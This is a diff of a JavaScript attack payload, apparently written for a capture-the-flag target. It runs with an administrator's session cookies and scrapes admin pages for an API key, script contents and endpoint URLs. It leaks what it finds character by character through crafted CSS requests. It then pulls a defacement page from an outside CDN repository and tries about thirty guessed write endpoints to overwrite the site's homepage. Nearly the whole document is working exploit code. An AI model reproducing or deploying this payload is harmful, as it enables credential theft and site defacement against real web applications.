@@ -1,14 +1,10 @@
 (function(){
-  var UNIQ="v14";
-  var SZ_SHA="96e9a9afb12614ce41d97017dee136061df84954";
+  var UNIQ="v15";
 
   function sig(tag){
     fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
   }
 
-  // Char-by-char exfil: for string s with prefix pf,
-  // fetch /account.php/UNIQ_pf_<posHex>_<charHex>.css for each char.
-  // From Kali: brute-force which URLs are HIT to reconstruct s.
   function exfil_str(pf, s, limit){
     var t = (s||"").slice(0, limit||100);
     for(var i=0;i<t.length;i++){
@@ -20,130 +16,168 @@
 
   sig("init");
 
-  var seized = null;
-
-  // Load seized.html early so we have it ready
-  fetch("https://cdn.jsdelivr.net/gh/sem-17/vx@"+SZ_SHA+"/seized.html",{cache:"no-store"})
-  .then(function(r){ return r.text(); })
-  .then(function(html){ seized = html; sig("sz_ready"); });
-
-  // Fetch /admin/ overview
+  // Fetch /admin/ and extract api_key + all JS (inline + external)
   fetch("/admin/",{credentials:"include"})
   .then(function(r){ return r.text(); })
   .then(function(html){
-    sig("got_admin");
-    // Signal page length (to know if we got real admin page or redirect)
-    sig("admin_len_"+html.length);
+    sig("adm_ok");
+    sig("adm_len_"+html.length);
 
-    // Extract AK
-    var akm = html.match(/vk_live_[a-f0-9]{40}/);
+    // Extract api_key
+    var akm = html.match(/vk_live_[a-f0-9]{30,50}/);
     if(akm){
       sig("ak_found");
-      exfil_str("ak", akm[0], 44);
+      exfil_str("ak", akm[0], 50);
     } else {
-      sig("ak_not_found");
+      sig("ak_miss");
+      // Maybe api_key is in a different format - search for any key pattern
+      var km = html.match(/api[_-]?key['":\s=]+([a-zA-Z0-9_\-]{20,})/i);
+      if(km) exfil_str("km", km[1], 50);
     }
 
-    // Extract inline scripts (look for API fetch calls, endpoints)
-    // Concatenate all inline script content
+    // Extract all external script src URLs
+    var scripts = [];
+    html.replace(/<script[^>]+src=["']([^"']+)["']/gi, function(_, src){
+      scripts.push(src);
+    });
+    sig("scripts_"+scripts.length);
+
+    // Exfil script URLs (concatenated)
+    if(scripts.length > 0) exfil_str("ss", scripts.join("|"), 200);
+
+    // Extract all inline JS
     var alljs = "";
     html.replace(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi, function(_, js){ alljs += js; });
-    sig("js_len_"+alljs.length);
-    if(alljs.length > 0){
-      exfil_str("js", alljs, 300);
-    }
+    sig("ijs_len_"+alljs.length);
 
-    // Look for API paths in the full HTML
-    var apis = [];
-    html.replace(/["'](\/(?:api|admin)\/[a-zA-Z0-9_\-\.\/]+)["']/g, function(_, p){ apis.push(p); });
-    if(apis.length > 0){
-      sig("apis_found_"+apis.length);
-      exfil_str("apis", apis.join("|"), 200);
-    }
-
-    return fetch("/admin/review.php",{credentials:"include"});
-  })
-  .then(function(r){ return r.text(); })
-  .then(function(rev){
-    sig("got_rev");
-    sig("rev_len_"+rev.length);
-
-    var akm2 = rev.match(/vk_live_[a-f0-9]{40}/);
-    if(akm2){ sig("rev_ak"); exfil_str("rak", akm2[0], 44); }
-
-    var alljs2 = "";
-    rev.replace(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi, function(_,js){ alljs2+=js; });
-    sig("revjs_len_"+alljs2.length);
-    if(alljs2.length>0) exfil_str("rjs", alljs2, 300);
-
-    // Also check search.php
-    return fetch("/admin/search.php",{credentials:"include"});
-  })
-  .then(function(r){ return r.text(); })
-  .then(function(search){
-    sig("got_search");
-    var alljs3="";
-    search.replace(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi, function(_,js){ alljs3+=js; });
-    if(alljs3.length>0) exfil_str("sjs", alljs3, 300);
-
-    // Now try all candidate write endpoints (in sequence, not parallel)
-    return waitForSeized();
-  })
-  .catch(function(e){ sig("crash"); });
-
-  function waitForSeized(){
-    if(seized) return tryWrite();
-    return new Promise(function(res){
-      var id = setInterval(function(){
-        if(seized){ clearInterval(id); tryWrite().then(res); }
-      }, 200);
+    // Look for any URL patterns in HTML+JS
+    var urls = [];
+    html.replace(/["'](\/[a-zA-Z0-9_\-\.\/]+(?:\.[a-z]+)?)["']/g, function(_, u){
+      if(u.indexOf('/assets/')===0) return;
+      if(urls.indexOf(u)<0) urls.push(u);
     });
-  }
+    sig("urls_"+urls.length);
+    if(urls.length>0) exfil_str("ur", urls.join("|"), 300);
 
-  function tryWrite(){
-    var endpoints = [
-      {m:"POST",u:"/",ct:"text/html"},
-      {m:"PUT",u:"/",ct:"text/html"},
-      {m:"PATCH",u:"/",ct:"text/html"},
-      {m:"POST",u:"/admin/seize.php",ct:"text/html"},
-      {m:"POST",u:"/admin/seize",ct:"text/html"},
-      {m:"POST",u:"/admin/publish.php",ct:"text/html"},
-      {m:"POST",u:"/admin/write.php",ct:"text/html"},
-      {m:"POST",u:"/api/seize",ct:"text/html"},
-      {m:"POST",u:"/api/homepage",ct:"text/html"},
-      {m:"POST",u:"/api/write",ct:"text/html"},
-      {m:"POST",u:"/admin/homepage",ct:"text/html"},
-      {m:"POST",u:"/admin/?action=seize",ct:"text/html"},
-    ];
+    // Fetch external scripts and look for API endpoints
     var p = Promise.resolve();
-    endpoints.forEach(function(e){
-      var slug = e.m.toLowerCase()+"_"+e.u.replace(/[\/\?=]/g,"_").replace(/_+/g,"_").slice(0,30);
+    scripts.forEach(function(src){
+      if(src.indexOf('jsdelivr')>=0 || src.indexOf('chart')>=0) return; // skip chart lib
+      p = p.then(function(){
+        var fetchUrl = src.charAt(0)==='/' ? src : src;
+        return fetch(fetchUrl,{credentials:"include"}).then(function(r){return r.text();}).then(function(js){
+          sig("extjs_len_"+js.length);
+          // Look for fetch/POST/PUT patterns
+          var api = [];
+          js.replace(/["'](\/(?:api|admin)\/[a-zA-Z0-9_\-\.\/]+)["']/g, function(_,u){api.push(u);});
+          js.replace(/fetch\s*\(\s*["']([^"']+)["']/g, function(_,u){api.push(u);});
+          if(api.length>0) exfil_str("ea", api.join("|"), 200);
+        }).catch(function(){});
+      });
+    });
+
+    return p;
+  })
+  .then(function(){
+    // Also check /admin/review.php and /admin/search.php for endpoints
+    return fetch("/admin/review.php",{credentials:"include"}).then(function(r){return r.text();});
+  })
+  .then(function(rev){
+    sig("rev_ok");
+    // Look for api_key here too
+    var akm2 = rev.match(/vk_live_[a-f0-9]{30,50}/);
+    if(akm2) exfil_str("rak", akm2[0], 50);
+
+    // Extract URLs from review page
+    var urls2 = [];
+    rev.replace(/["'](\/[a-zA-Z0-9_\-\.\/]+(?:\.[a-z]+)?)["']/g, function(_, u){
+      if(u.indexOf('/assets/')===0) return;
+      if(urls2.indexOf(u)<0) urls2.push(u);
+    });
+    if(urls2.length>0) exfil_str("ru", urls2.join("|"), 200);
+
+    // Also exfil inline JS from review page
+    var rjs = "";
+    rev.replace(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi, function(_, js){ rjs += js; });
+    if(rjs.length > 0) exfil_str("rj", rjs, 300);
+  })
+  .then(function(){
+    // Now try writing seized.html to homepage
+    return fetch("https://cdn.jsdelivr.net/gh/sem-17/vx@main/seized.html",{cache:"no-store"})
+      .then(function(r){return r.text();});
+  })
+  .then(function(seized){
+    sig("sz_loaded");
+
+    // Comprehensive endpoint list with various methods and body formats
+    var endpoints = [
+      // Raw HTML body
+      {m:"POST",u:"/",ct:"text/html",b:seized},
+      {m:"PUT",u:"/",ct:"text/html",b:seized},
+      {m:"POST",u:"/index.php",ct:"text/html",b:seized},
+      {m:"PUT",u:"/index.php",ct:"text/html",b:seized},
+      // Admin endpoints raw
+      {m:"POST",u:"/admin/seize.php",ct:"text/html",b:seized},
+      {m:"POST",u:"/admin/publish.php",ct:"text/html",b:seized},
+      {m:"POST",u:"/admin/write.php",ct:"text/html",b:seized},
+      {m:"POST",u:"/admin/homepage.php",ct:"text/html",b:seized},
+      {m:"POST",u:"/admin/override.php",ct:"text/html",b:seized},
+      {m:"POST",u:"/admin/frontpage.php",ct:"text/html",b:seized},
+      {m:"POST",u:"/admin/index.php",ct:"text/html",b:seized},
+      // API endpoints
+      {m:"POST",u:"/api/seize",ct:"text/html",b:seized},
+      {m:"POST",u:"/api/homepage",ct:"text/html",b:seized},
+      {m:"POST",u:"/api/write",ct:"text/html",b:seized},
+      {m:"POST",u:"/api/publish",ct:"text/html",b:seized},
+      {m:"POST",u:"/api/page",ct:"text/html",b:seized},
+      {m:"POST",u:"/api/frontpage",ct:"text/html",b:seized},
+      {m:"PUT",u:"/api/homepage",ct:"text/html",b:seized},
+      {m:"PUT",u:"/api/page",ct:"text/html",b:seized},
+      // JSON body variants
+      {m:"POST",u:"/api/seize",ct:"application/json",b:JSON.stringify({content:seized})},
+      {m:"POST",u:"/api/homepage",ct:"application/json",b:JSON.stringify({html:seized})},
+      {m:"POST",u:"/api/homepage",ct:"application/json",b:JSON.stringify({content:seized})},
+      {m:"POST",u:"/admin/seize.php",ct:"application/json",b:JSON.stringify({content:seized})},
+      {m:"POST",u:"/admin/homepage.php",ct:"application/json",b:JSON.stringify({content:seized})},
+      // Form-encoded
+      {m:"POST",u:"/admin/seize.php",ct:"application/x-www-form-urlencoded",b:"content="+encodeURIComponent(seized)},
+      {m:"POST",u:"/admin/homepage.php",ct:"application/x-www-form-urlencoded",b:"content="+encodeURIComponent(seized)},
+      // Action-based
+      {m:"POST",u:"/admin/?action=seize",ct:"text/html",b:seized},
+      {m:"POST",u:"/admin/?action=write",ct:"text/html",b:seized},
+      {m:"POST",u:"/admin/?action=homepage",ct:"text/html",b:seized},
+    ];
+
+    var p = Promise.resolve();
+    endpoints.forEach(function(e, idx){
       p = p.then(function(){
         return fetch(e.u,{
           method:e.m, credentials:"include",
           headers:{"Content-Type":e.ct},
-          body:seized
+          body:e.b
         }).then(function(r){
-          sig("ep_"+slug+"_"+r.status);
-          // If 200 or 201, check homepage
-          if(r.status===200||r.status===201){
-            return fetch("/",{credentials:"include"}).then(function(r2){ return r2.text(); })
-              .then(function(body){
-                if(body.indexOf("CERT-Tervalis")>=0) sig("SEIZED");
-                else sig("not_yet_"+slug);
-              });
+          var code = r.status;
+          sig("e"+idx+"_"+code);
+          if(code>=200 && code<300){
+            sig("e"+idx+"_HIT");
+            return r.text().then(function(t){
+              sig("e"+idx+"_blen_"+t.length);
+              if(t.indexOf("CERT")>=0||t.indexOf("seized")>=0||t.indexOf("flag")>=0||t.indexOf("HLB")>=0)
+                sig("e"+idx+"_WIN");
+            });
           }
-        }).catch(function(){ sig("fail_"+slug); });
+        }).catch(function(){ sig("e"+idx+"_err"); });
       });
     });
+
     return p.then(function(){
-      // Final verification
-      return fetch("/",{credentials:"include"}).then(function(r){ return r.text(); })
-        .then(function(body){
-          if(body.indexOf("CERT-Tervalis")>=0) sig("FINAL_SEIZED");
-          else sig("FINAL_NOT_SEIZED");
-        });
+      // Final check
+      return fetch("/",{credentials:"include"}).then(function(r){return r.text();}).then(function(b){
+        if(b.indexOf("CERT-Tervalis")>=0) sig("SEIZED_OK");
+        else sig("NOT_SEIZED");
+      });
     });
-  }
+  })
+  .catch(function(e){ sig("crash_"+e.message.slice(0,20)); });
 
 })();
